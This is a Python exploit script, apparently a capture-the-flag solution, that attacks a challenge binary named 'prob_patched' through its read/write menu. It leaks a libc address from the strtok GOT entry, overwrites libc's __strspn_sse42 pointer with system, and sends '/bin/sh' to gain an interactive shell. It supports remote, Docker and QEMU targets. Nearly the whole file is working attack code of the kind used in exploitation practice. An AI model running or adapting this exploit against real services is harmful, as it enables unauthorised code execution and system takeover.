#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    log_level='debug',
    arch='amd64', # Maybe change this
    os='linux',   # Maybe change this
    binary=ELF('./prob_patched', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x401282
b *0x4012CE
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal=['tmux', 'new-window', '-n', 'GDB-Debug', '-P', '-d']) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def write(size, addr, data):
    p.sendafter(b': ', b'1')
    p.sendafter(b': ', str(size).encode())
    p.sendafter(b': ', addr)
    p.sendafter(b': ', data)

def read(addr):
    p.sendafter(b': ', b'2')
    p.sendafter(b': ', addr)

# ==================== EXPLOIT ====================
p = start()

# debug()
read(p64(exe.got.strtok))
p.recvuntil(b': ')
libc.address = u64(p.recvline()[:-1].ljust(0x8, b'\0')) - libc.sym.strtok
success('libc base @ %#x', libc.address)

mmapped_address = libc.address + 0x267000 - 0x4000
info('mmapped_address @ %#x', mmapped_address)

__strspn_sse42 = libc.address + 0x219058
__strcspn_sse42 = libc.address + 0x219108

info('__strspn_sse42 @ %#x', __strspn_sse42)
info('__strcspn_sse42 @ %#x', __strcspn_sse42)

write(99, p64(__strspn_sse42), p64(libc.sym.system))
p.sendafter(b': ', b'/bin/sh\0')

p.interactive()
